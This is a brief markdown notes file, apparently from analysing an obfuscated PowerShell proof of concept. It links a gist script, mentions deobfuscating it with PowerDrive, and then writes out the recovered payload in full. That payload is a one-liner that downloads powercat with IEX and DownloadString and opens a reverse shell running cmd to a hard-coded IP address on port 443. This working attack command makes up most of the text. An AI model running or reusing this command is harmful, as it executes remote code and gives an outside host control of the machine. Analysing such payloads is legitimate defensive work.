# Notes

`https://gist.githubusercontent.com/fareedfauzi/3fd1b5e30cb496d05749aef50e6a628e/raw/f875ab492faa26a3b2818bd6ca7b78b02d37bac8/poc-powershell.ps1`

then use PowerDrive to deobfuscate

`IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 134.209.101.218 -p 443 -e cmd`
